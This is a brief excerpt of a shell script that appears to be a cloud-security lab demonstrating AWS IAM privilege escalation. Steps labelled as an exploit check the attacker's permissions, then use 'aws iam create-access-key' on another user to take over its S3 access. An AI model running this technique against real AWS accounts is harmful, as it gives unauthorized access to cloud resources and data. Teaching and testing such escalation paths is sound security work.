...
# [EXPLOIT] Step 4: Check current permissions (proving attacker lacks S3 access)
...
# [EXPLOIT] Step 5: Create access keys for the bucket access user
echo -e "${YELLOW}Step 5: Creating access keys for $BUCKET_ACCESS_USER${NC}"
use_starting_creds
echo "This is the privilege escalation vector..."

show_attack_cmd "Attacker" "aws iam create-access-key --user-name $BUCKET_ACCESS_USER --output json"
...
# [EXPLOIT] Step 6: Switch to new bucket access user credentials
